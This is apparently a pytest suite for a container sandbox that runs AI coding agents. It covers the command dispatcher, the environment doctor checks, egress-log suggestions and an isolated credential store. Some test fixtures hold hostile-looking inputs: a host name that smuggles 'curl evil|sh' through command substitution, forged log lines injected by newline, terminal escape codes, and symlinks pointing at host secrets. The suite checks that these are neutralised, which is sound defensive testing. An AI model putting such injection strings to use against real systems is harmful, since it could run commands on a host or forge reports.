"""Contracts for the sandbox-ai dispatcher, doctor and log summary."""
import importlib.util
import json
import os
from pathlib import Path
import subprocess
import sys
from unittest.mock import Mock

import pytest

ROOT = Path(__file__).resolve().parents[1]


def load(name):
    spec = importlib.util.spec_from_file_location(f"sandbox_{name}_test", ROOT / "sandbox" / f"{name}.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


doctor, logs, login = load("doctor"), load("logs"), load("login")


@pytest.fixture(params=["happy", "sad", "edge"])
def scenario(request):
    return request.param


def sandbox_ai(*args, **env):
    return subprocess.run([str(ROOT / "sandbox-ai"), *args], capture_output=True, text=True,
                          env={**os.environ, **env}, timeout=60)


def test_dispatcher(scenario, tmp_path):
    if scenario == "happy":
        for command in (["version"], ["--version"], ["claude", "--version"], ["session", "--version"],
                        ["mcp", "--version"], ["wizard", "--version"], ["build", "--version"],
                        ["login", "--version"]):
            result = sandbox_ai(*command)
            assert result.returncode == 0 and result.stdout.strip().startswith("sandbox-ai "), (command, result.stderr)
        plan = sandbox_ai("codex", "--workspace", str(tmp_path / "w"), "--offline", "--no-auth", "--dry-run")
        assert json.loads(plan.stdout)["agent"] == "codex"
    elif scenario == "sad":
        assert sandbox_ai("bogus").returncode == 2 and "unknown command" in sandbox_ai("bogus").stderr
        assert sandbox_ai().returncode == 2
        # A checkout is updated with git, not with install.sh.
        update = sandbox_ai("update")
        assert update.returncode == 1 and "not installed by install.sh" in update.stderr
    else:
        result = sandbox_ai("--help")
        assert result.returncode == 0
        for command in ("session", "mcp", "wizard", "build", "doctor", "logs", "update"):
            assert f"sandbox-ai {command}" in result.stdout


def test_check_subids(scenario, tmp_path):
    (tmp_path / "subuid").write_text({"happy": "me:100000:65536\n", "sad": "other:100000:65536\n",
                                      "edge": "1000:100000:70000\nme:1:10\n"}[scenario])
    (tmp_path / "subgid").write_text("me:100000:65536\n")
    status, _, detail, hint = doctor.check_subids("me", 1000, tmp_path)
    assert status == {"happy": "ok", "sad": "fail", "edge": "ok"}[scenario]
    if scenario == "sad":
        assert "usermod" in hint and "subuid: 0" in detail


def test_check_userns(scenario, tmp_path):
    (tmp_path / "user").mkdir()
    (tmp_path / "kernel").mkdir()
    (tmp_path / "user/max_user_namespaces").write_text("0\n" if scenario == "sad" else "15000\n")
    if scenario == "edge":
        (tmp_path / "kernel/apparmor_restrict_unprivileged_userns").write_text("1\n")
    assert doctor.check_userns(tmp_path)[0] == {"happy": "ok", "sad": "fail", "edge": "warn"}[scenario]


def test_check_podman(scenario, monkeypatch):
    monkeypatch.setattr(doctor.shutil, "which", lambda name: None if scenario == "sad" else "/usr/bin/" + name)
    answers = {"happy": [(0, "true"), (0, "5.2.1")], "edge": [(0, "false")]}.get(scenario, [])
    monkeypatch.setattr(doctor, "run", Mock(side_effect=answers))
    status, _, detail, hint = doctor.check_podman()
    if scenario == "happy":
        assert status == "ok" and "5.2.1" in detail
    elif scenario == "sad":
        assert status == "fail" and "passt" in hint
    else:
        assert status == "fail" and detail == "not rootless"


def test_check_image(scenario, monkeypatch):
    monkeypatch.setattr(doctor.shutil, "which", lambda name: "/usr/bin/podman")
    monkeypatch.setattr(doctor, "run", Mock(return_value={"happy": (0, "1.0.42"), "sad": (125, ""),
                                                          "edge": (0, "<no value>")}[scenario]))
    status, _, detail, hint = doctor.check_image("claude")
    assert status == {"happy": "ok", "sad": "warn", "edge": "ok"}[scenario]
    assert ("claude 1.0.42" in detail) == (scenario == "happy")
    assert ("sandbox-build-image claude" in hint) == (scenario != "happy")


def test_check_login(scenario, tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.delenv("CLAUDE_CONFIG_DIR", raising=False)
    credentials = tmp_path / ".claude/.credentials.json"
    if scenario != "sad":
        credentials.parent.mkdir()
        login = {"accessToken": "secret-access", "refreshToken": "secret-refresh", "expiresAt": 4102444800000}
        credentials.write_text(json.dumps({"claudeAiOauth": login} if scenario == "happy" else {"other": 1}))
    status, _, detail, hint = doctor.check_login("claude")
    assert status == {"happy": "ok", "sad": "warn", "edge": "warn"}[scenario]
    assert "secret" not in detail + hint
    if scenario == "sad":
        assert "sandbox-ai login claude" in hint


def test_check_tiocsti(scenario, tmp_path):
    sysctl = tmp_path / "legacy_tiocsti"
    if scenario != "edge":
        sysctl.write_text("0\n" if scenario == "happy" else "1\n")
    assert doctor.check_tiocsti(sysctl)[0] == ("ok" if scenario == "happy" else "fail")


def test_doctor_report(scenario, capsys):
    results = {"happy": [("ok", "A", "fine", "")], "sad": [("fail", "A", "broken", "fix it"), ("ok", "B", "", "")],
               "edge": [("warn", "A", "odd\x1b[2J", "look"), ("skip", "B", "-", "")]}[scenario]
    lines = []
    assert doctor.report(results, lines.append) == (1 if scenario == "sad" else 0)
    text = "\n".join(lines)
    assert "\x1b" not in text
    assert ("-> fix it" in text) == (scenario == "sad")


def log_dir(tmp_path, denied, files=()):
    directory = tmp_path / "logs"
    directory.mkdir()
    (directory / "egress-denied.jsonl").write_text("".join(json.dumps(r) + "\n" for r in denied) + "not json\n")
    (directory / "files.jsonl").write_text("".join(json.dumps(r) + "\n" for r in files))
    return directory


def test_log_suggestions(scenario):
    record = {"happy": {"host": "pypi.org"}, "sad": {"address": "not-an-ip", "protocol": "tcp", "port": 1},
              "edge": {"address": "127.0.0.1", "protocol": "tcp", "port": 3000}}[scenario]
    found = logs.suggestion(record)
    expected = {"happy": "--allow-pypi", "sad": None, "edge": "--allow-host-port 3000"}[scenario]
    assert (found[1] if found else None) == expected
    assert logs.suggestion({"address": "192.0.2.7", "protocol": "udp", "port": 53})[1] == "--allow 192.0.2.7"
    assert logs.suggestion({"address": "2001:db8::1", "protocol": "tcp", "port": 22})[1] == "--allow-tcp [2001:db8::1]:22"
    assert logs.suggestion({"host": "api.openai.com"})[1] == "--profile frontier"
    assert logs.suggestion({"host": "example.org"})[1] == "--allow-host example.org"


def test_summarize_and_report(scenario, tmp_path, capsys):
    denied = {"happy": [{"host": "pypi.org"}, {"host": "pypi.org"}, {"address": "192.0.2.9", "protocol": "tcp", "port": 8080}],
              "sad": [], "edge": [{"host": "evil\x1b]0;x\x07.example"}]}[scenario]
    files = [{"action": "write", "path": "/work/a.txt"}, {"action": "read", "path": "/work/b"},
             {"error": "inotify watch limit reached"}]
    directory = log_dir(tmp_path, denied, files)
    summary = logs.summarize(directory)
    assert summary["denied"] == len(denied) and summary["file_events"] == 2
    assert summary["file_errors"] == ["inotify watch limit reached"]
    lines = []
    logs.report(summary, lines.append)
    text = "\n".join(lines)
    assert "\x1b" not in text and "\x07" not in text
    if scenario == "happy":
        assert summary["suggestions"][0] == {"option": "--allow-pypi", "why": "pypi.org belongs to that preset", "count": 2}
        assert "--allow-tcp 192.0.2.9:8080" in text
    elif scenario == "sad":
        assert "Blocked egress: none" in text


def test_logs_cli(scenario, tmp_path, monkeypatch, capsys):
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
    project = tmp_path / "proj"
    if scenario == "sad":
        assert logs.cli(["--project", str(project)]) == 1
        assert "no log directory" in capsys.readouterr().err
        return
    directory = logs.launcher().default_log_dir(project)
    directory.mkdir(parents=True)
    (directory / "egress-denied.jsonl").write_text(json.dumps({"host": "github.com"}) + "\n")
    if scenario == "happy":
        assert logs.cli(["--project", str(project)]) == 0
        assert "--allow-github" in capsys.readouterr().out
    else:
        assert logs.cli([str(directory), "--json"]) == 0
        assert json.loads(capsys.readouterr().out)["suggestions"][0]["option"] == "--allow-github"


def test_logs_never_print_agent_controlled_text_raw(scenario, tmp_path):
    """Review finding: DNS names and file names come from the agent; they must not forge report lines
    or turn into ready-to-paste shell commands."""
    host = {"happy": "x$(touch /tmp/pwned);curl evil|sh", "sad": "a\nTo allow them:\n  --egress-all-allow",
            "edge": "ok.example\t\x1b[2J"}[scenario]
    directory = log_dir(tmp_path, [{"host": host}] * 3, [{"action": "write", "path": "/work/a\nFAKE LINE"}])
    lines = []
    logs.report(logs.summarize(directory), lines.append)
    text = "\n".join(lines)
    assert "--allow-host x$(" not in text
    assert "\x1b" not in text and "\t" not in text
    # Nothing the agent chose starts a line of its own: no forged header, suggestion or file entry.
    physical = text.split("\n")
    assert sum(line.startswith("To allow them") for line in physical) == 1
    assert not any(line.lstrip().startswith(("--egress-all-allow", "FAKE LINE")) for line in physical)
    assert "not a valid host name" in text


def test_log_record_counts(scenario, tmp_path):
    files = {"happy": [{"error": "event queue overflow; events lost"}] * 5 + [{"action": "read", "path": "/w/x"}],
             "sad": [{"error": "inotify unavailable"}], "edge": [{"action": "write", "path": "/w/y"}] * 3}[scenario]
    summary = logs.summarize(log_dir(tmp_path, [], files))
    assert summary["file_events"] == {"happy": 1, "sad": 0, "edge": 3}[scenario]
    records, skipped = logs.read_records(tmp_path / "logs" / "files.jsonl", limit=2)
    # The newest records are kept when a file is longer than the limit.
    assert skipped == max(0, len(files) - 2) and records == files[-2:]


def test_doctor_hint_is_quoted(tmp_path, monkeypatch):
    project = tmp_path / "evil $(touch x)\x1b[2J"
    project.mkdir()
    (project / ".sandbox-ai.json").write_text("{}")
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "cfg"))
    status, _, _, hint = doctor.check_project(project)
    assert status == "warn" and "'" in hint
    lines = []
    doctor.report([(status, "Project", "x", hint)], lines.append)
    assert "\x1b" not in "\n".join(lines)


# --- sandbox-ai login -----------------------------------------------------------------------------


@pytest.fixture
def private_home(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path / "host"))
    for name in ("XDG_DATA_HOME", "XDG_STATE_HOME", "CLAUDE_CONFIG_DIR", "CODEX_HOME"):
        monkeypatch.delenv(name, raising=False)
    (tmp_path / "host").mkdir()
    return tmp_path / "host"


def claude_login_files(home, refresh="r1"):
    (home / ".claude").mkdir(parents=True, exist_ok=True)
    login = {"accessToken": "a1", "refreshToken": refresh, "expiresAt": 4102444800000, "subscriptionType": "max",
             "unknownField": "dropped"}
    (home / ".claude/.credentials.json").write_text(json.dumps({"claudeAiOauth": login, "mcpOAuth": {"x": 1}}))
    (home / ".claude.json").write_text(json.dumps({"oauthAccount": {"emailAddress": "e"}, "projects": {"/p": {}}}))


def test_login_collect(scenario, tmp_path, private_home):
    home = tmp_path / "staging"
    if scenario == "happy":
        claude_login_files(home)
        files = login.collect("claude", home)
        stored = json.loads(files[".claude/.credentials.json"])
        assert stored == {"claudeAiOauth": {"accessToken": "a1", "refreshToken": "r1", "expiresAt": 4102444800000,
                                            "subscriptionType": "max"}}
        assert json.loads(files[".claude.json"]) == {"oauthAccount": {"emailAddress": "e"}}
    elif scenario == "sad":
        home.mkdir()
        assert login.collect("claude", home) == {} and login.collect("codex", home) == {}
        (home / ".codex").mkdir()
        (home / ".codex/auth.json").write_text("[]")
        assert login.collect("codex", home) == {}
        (home / ".codex/auth.json").write_text('{"x": 1}')  # not a Codex login
        assert login.collect("codex", home) == {}
        (home / ".codex/auth.json").write_text('{"OPENAI_API_KEY": "sk-1"}')
        assert login.collect("codex", home) == {".codex/auth.json": b'{\n  "OPENAI_API_KEY": "sk-1"\n}'}
    else:
        # The login sandbox could plant links to host files: never followed.
        secret = tmp_path / "host-secret.json"
        secret.write_text('{"tokens": "host"}')
        (home / ".codex").mkdir(parents=True)
        (home / ".codex/auth.json").symlink_to(secret)
        assert login.collect("codex", home) == {}
        (home / ".local/share").mkdir(parents=True)
        (home / ".local/share/opencode").symlink_to(tmp_path)
        assert login.collect("opencode", home) == {}


def test_login_runs_the_agent_login_in_a_sandbox_and_stores_it(scenario, private_home, monkeypatch):
    seen = []

    def fake_run(cmd):
        seen.append(cmd)
        home = Path(cmd[cmd.index("--state-dir") + 1])
        if scenario != "sad":
            claude_login_files(home, refresh="fresh")
        return Mock(returncode=0)
    monkeypatch.setattr(login.subprocess, "run", fake_run)
    lines = []
    store = login.launcher().auth_store("claude")
    if scenario == "edge":
        claude_login_files(store, refresh="old")  # an older stored login is replaced as a whole
        (store / "stray").write_text("x")
    result = login.login("claude", ["--backend", "bwrap"], out=lines.append)
    cmd = seen[0]
    assert cmd[cmd.index("--") + 1:] == ["auth", "login"]
    assert {"--no-auth", "--no-config", "--no-tmux"} <= set(cmd) and cmd[cmd.index("--binary") + 1] == "claude"
    assert ["--backend", "bwrap"] == cmd[4:6]
    # The staging HOME is gone afterwards, whatever happened.
    assert not list(login.launcher().auth_store().glob(".login-*"))
    if scenario == "sad":
        assert result == 1 and not store.exists() and "nothing stored" in lines[-1]
        return
    assert result == 0
    stored = json.loads((store / ".claude/.credentials.json").read_text())
    assert stored["claudeAiOauth"]["refreshToken"] == "fresh" and "mcpOAuth" not in stored
    assert oct((store / ".claude/.credentials.json").stat().st_mode & 0o777) == "0o600"
    assert not (store / "stray").exists()
    # From now on sandboxes get this login, not the host's.
    assert login.launcher().auth_sources("claude")[0][0] == store / ".claude/.credentials.json"


def test_login_logout_and_status(scenario, private_home, capsys):
    if scenario == "sad":
        assert login.logout("codex") == 1
        return
    claude_login_files(login.launcher().auth_store("claude"))
    if scenario == "happy":
        assert login.status() == 0
        text = capsys.readouterr().out
        assert "claude    login store" in text and "codex     host" in text and "no login" in text
        assert "a1" not in text and "r1" not in text
    else:
        assert login.logout("claude") == 0
        assert not login.launcher().auth_store("claude").exists()
        assert login.launcher().login_state("claude") == ("host", "missing")


def test_login_cli(scenario, monkeypatch):
    calls = []
    monkeypatch.setattr(login, "login", lambda *a: calls.append(a) or 0)
    monkeypatch.setattr(login, "status", lambda: calls.append("status") or 0)
    if scenario == "happy":
        assert login.cli(["codex", "--backend", "bwrap", "--", "login"]) == 0
        # Review finding: launcher options before the agent name work too.
        assert login.cli(["--backend", "bwrap", "claude"]) == 0
        assert calls == [("codex", ["--backend", "bwrap"], ["login"]), ("claude", ["--backend", "bwrap"], None)]
    elif scenario == "sad":
        with pytest.raises(SystemExit):
            login.cli([])
    else:
        assert login.cli(["--status"]) == 0 and calls == ["status"]


def test_login_write_store_replaces_in_place(scenario, private_home, tmp_path):
    store = login.launcher().auth_store("claude")
    files = {".claude/.credentials.json": b'{"new": 1}', ".claude.json": b"{}"}
    if scenario == "happy":
        claude_login_files(store, refresh="old")
        (store / "stray").write_text("x")
        (store / "olddir").mkdir()
        inode = store.stat().st_ino
        login.write_store("claude", files)
        # The directory itself was never replaced (no moment without a store), stale files are gone.
        assert store.stat().st_ino == inode
        assert sorted(str(p.relative_to(store)) for p in store.rglob("*")) == [".claude", ".claude.json",
                                                                              ".claude/.credentials.json"]
        assert (store / ".claude/.credentials.json").read_bytes() == b'{"new": 1}'
    elif scenario == "sad":
        store.parent.mkdir(parents=True)
        store.symlink_to(tmp_path)
        with pytest.raises(ValueError, match="symlink"):
            login.write_store("claude", files)
    else:
        store.mkdir(parents=True)
        (store / ".claude").symlink_to(tmp_path)
        with pytest.raises(ValueError, match="symlink"):
            login.write_store("claude", files)
        assert not (tmp_path / ".credentials.json").exists()


def test_check_proxy_nat(scenario, tmp_path):
    for name in {"happy": ["nft_chain_nat", "nft_redir"], "sad": [], "edge": ["nft_chain_nat"]}[scenario]:
        (tmp_path / name).mkdir()
    status, _, detail, fix = doctor.check_proxy_nat(tmp_path)
    assert status == ("ok" if scenario == "happy" else "warn")
    if scenario == "edge":
        assert "nft_redir" in detail and "nft_chain_nat" not in detail and "modprobe" in fix


def test_logs_telemetry_counts_models_pushes_credentials_and_processes(tmp_path, capsys):
    spec = importlib.util.spec_from_file_location("logs_telemetry", ROOT / "sandbox/logs.py")
    logs = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(logs)
    (tmp_path / "connections-1.jsonl").write_text("\n".join(json.dumps(r) for r in [
        {"event": "http", "host": "api.anthropic.com", "credentials": ["x-api-key"],
         "model": {"model": "claude-opus-5-5", "usage": {"input_tokens": 100, "output_tokens": 20}}},
        {"event": "http", "host": "api.anthropic.com", "credentials": ["x-api-key"],
         "model": {"model": "claude-opus-5-5", "usage": {"input_tokens": 50, "output_tokens": 5}}},
        {"event": "http", "host": "github.com", "push": {"ok": False}},
        {"event": "denied", "destination": "192.0.2.1:22"}]) + "\n")
    (tmp_path / "processes.jsonl").write_text(json.dumps({"pid": 3, "command": "/usr/bin/git push"}) + "\n")
    seen = logs.telemetry(tmp_path)
    assert seen["requests"] == 3 and seen["model_calls"] == {"claude-opus-5-5": 2}
    assert seen["tokens"] == {"input_tokens": 150, "output_tokens": 25} and seen["pushes"] == {"ok": 0, "refused": 1}
    assert seen["credentials"] == [("x-api-key -> api.anthropic.com", 2)] and seen["programs"] == [("git", 1)]
    state = tmp_path / "state"
    (state / "sandbox-ai/mcp/ddg").mkdir(parents=True)
    (state / "sandbox-ai/mcp/ddg/supervisor.log").write_text(
        'noise\nsandbox-ai-mcp-call {"time": "t", "tool": "web_search", "arguments": "{}"}\n')
    assert logs.tool_calls(state) == {"ddg": [("t", "web_search")]}
    assert logs.report({**logs.summarize(tmp_path), "telemetry": seen, "tool_calls": logs.tool_calls(state)},
                       out=print) == 0
    out = capsys.readouterr().out
    assert "Model calls: 2x claude-opus-5-5; tokens: input_tokens 150, output_tokens 25" in out
    assert "MCP ddg: 1 tool call(s): web_search" in out
